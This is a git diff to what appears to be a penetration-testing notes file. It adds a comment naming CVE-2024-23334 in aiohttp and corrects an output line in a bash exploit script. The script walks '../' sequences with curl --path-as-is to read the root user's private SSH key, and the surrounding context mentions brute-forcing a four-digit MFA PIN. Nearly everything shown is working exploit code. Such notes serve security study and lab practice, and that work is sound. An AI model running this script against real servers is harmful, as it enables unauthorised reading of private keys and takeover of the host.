@@ -35,6 +35,7 @@ Find a 4 digits pin for weak MFA:
 
 ```
 #!/bin/bash
+# CVE-2024-23334 AioHTTP library =< 3.9.1
 url="http://localhost:" # application url
 up="../"
 port="8080" # application port
@@ -43,7 +44,7 @@ payload=$path
 target="root/.ssh/id_rsa" # target file
 for((i=0;i<20;i++)); do
   payload+="$up"
-  echo "[+] Testing $path/$target"
+  echo "[+] Testing $payload/$target"
   status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$port$payload$target")
   echo -e "\tStatus code --> $status_code"
   if [[ $status_code -eq 200 ]]; then
